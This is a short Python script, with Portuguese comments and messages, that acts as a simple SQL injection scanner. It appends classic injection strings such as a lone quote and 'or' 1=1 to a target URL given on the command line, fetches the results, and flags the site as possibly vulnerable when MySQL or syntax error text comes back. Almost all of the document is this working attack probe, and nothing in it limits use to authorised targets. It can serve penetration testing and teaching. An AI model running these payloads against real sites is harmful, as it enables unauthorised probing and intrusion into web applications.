#!/usr/bin/env python3

import sys, urllib, urllib.request

def SqlInjectionTeste(url):
	sqlvetor = ["\'", "\'or\' 1=1", "1\' or \'1\' = \'1\'"]

	urlcompleta = url		
	procuraHttp = urlcompleta.find('http' or 'https')
	if procuraHttp < 0:
		print ("\033[01;31m\n[ERRO] O Site deve conter http:// \033[0m\n\n")
	else:
		pass	
	
	retorno = urlcompleta.find('=')
	corte = urlcompleta[:retorno + 1]
	urlVetor = [str(corte), str(urlcompleta)] 
		
	for i in range(3):
		for j in range(2):
			stringSql = urlVetor[j] + sqlvetor[i]
			print (stringSql)
			x = urllib.request.urlopen(stringSql)
			y = x.read()
			z = y.decode('iso-8859-1' or 'utf-8')

			if (("Warning") in z) or (("MySQL") in z) or (("syntax") in z): 
				print ("\033[01;37m[V] Possivelmente Vulneravel...\033[0m\n")
			else:
				print ("\033[01;31m[X] Não Vulneravel...\033[0m\n")


SqlInjectionTeste(url = sys.argv[1])